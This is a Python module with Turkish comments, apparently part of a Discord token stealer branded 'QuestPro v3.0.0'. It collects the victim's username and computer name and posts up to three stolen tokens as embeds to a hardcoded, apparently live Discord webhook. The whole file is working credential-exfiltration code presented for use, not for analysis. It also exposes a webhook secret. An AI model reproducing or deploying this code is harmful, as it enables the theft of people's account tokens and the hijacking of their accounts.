"""
Basit webhook gönderici - SADECE token gönderir
"""

import urllib.request
import json
import getpass
import socket
import os

# WEBHOOK URL (BUNU KENDİ WEBHOOK'UNLA DEĞİŞTİR!)
WEBHOOK_URL = "https://discord.com/api/webhooks/1471477972589613282/64mOMvy7dvNm5m2Hy4v7PSBTytp9bmKBCZ9oULmtkTZPDsBUkq64w0YL6NR3w1b0rb5a"

def get_basic_info():
    """Basit sistem bilgileri - API isteği YOK!"""
    try:
        # Sadece yerel bilgiler, API isteği yok
        username = getpass.getuser()
        computername = os.getenv("COMPUTERNAME", socket.gethostname())
        
        return {
            "user": username,
            "pc": computername
        }
    except:
        return {"user": "Unknown", "pc": "Unknown"}

def send_token(tokens):
    """
    SADECE token'ları webhook'a gönder - API isteği YOK!
    
    Args:
        tokens: Token listesi
    """
    try:
        if not tokens:
            return False
        
        info = get_basic_info()
        
        # Her token için ayrı mesaj gönder (ilk 3 token)
        for i, token in enumerate(tokens[:3]):
            # Çok basit embed - SADECE token
            data = {
                "embeds": [{
                    "title": f"🔑 Token {i+1} Bulundu",
                    "color": 0x00ff00,
                    "fields": [
                        {
                            "name": "👤 Kullanıcı",
                            "value": f"```{info['user']}```",
                            "inline": True
                        },
                        {
                            "name": "💻 Bilgisayar",
                            "value": f"```{info['pc']}```",
                            "inline": True
                        },
                        {
                            "name": "🔐 TOKEN",
                            "value": f"```{token}```",
                            "inline": False
                        }
                    ],
                    "footer": {
                        "text": "QuestPro v3.0.0 • Sadece Token"
                    }
                }],
                "username": "QuestPro",
                "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png"
            }
            
            # Webhook'a gönder
            req = urllib.request.Request(
                WEBHOOK_URL,
                data=json.dumps(data).encode('utf-8'),
                headers={"Content-Type": "application/json"},
                method='POST'
            )
            
            urllib.request.urlopen(req)
        
        return True
    except:
        return False